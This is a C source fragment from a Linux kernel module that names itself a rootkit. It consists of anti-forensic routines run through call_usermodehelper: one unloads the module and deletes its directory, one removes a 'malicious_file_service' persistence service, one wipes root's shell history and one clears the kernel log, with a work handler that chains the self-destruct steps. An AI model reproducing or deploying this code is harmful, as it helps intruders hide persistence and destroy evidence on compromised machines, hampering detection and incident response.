#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/sched.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/kallsyms.h>
#include <linux/fs_struct.h>
#include <linux/slab.h>





void kboom(void){
    char *cmd_argv[] = { "/bin/bash", "-c", "/sbin/rmmod rootkit && /bin/rm -rf /module/", NULL };
    char *cmd_envp[] = { "HOME=/", "TERM=linux", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
    call_usermodehelper(cmd_argv[0], cmd_argv, cmd_envp, UMH_WAIT_EXEC);

}

void kboom_persistence(void){
    char *cmd_argv[] = { "/bin/bash", "-c", "rc-update del malicious_file_service && /bin/rm /etc/init.d/malicious_file_service", NULL };
    char *cmd_envp[] = { "HOME=/", "TERM=linux", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
    call_usermodehelper(cmd_argv[0], cmd_argv, cmd_envp, UMH_WAIT_EXEC);
}


void flush_history(void){
    char *cmd_argv[] = { "/bin/bash", "-c", "cat /dev/null > /root/.ash_history ", NULL };
    char *cmd_envp[] = { "HOME=/", "TERM=linux", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
    call_usermodehelper(cmd_argv[0], cmd_argv, cmd_envp, UMH_WAIT_EXEC);
}


void flush_dmesg(void){
    char *cmd_argv[] = { "/bin/bash", "-c", "dmesg --clear", NULL };
    char *cmd_envp[] = { "HOME=/", "TERM=linux", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
    call_usermodehelper(cmd_argv[0], cmd_argv, cmd_envp, UMH_WAIT_EXEC);
}


void one_thread_to_destruct_all(struct work_struct *work) {

    kboom_persistence(); 
    kboom();
}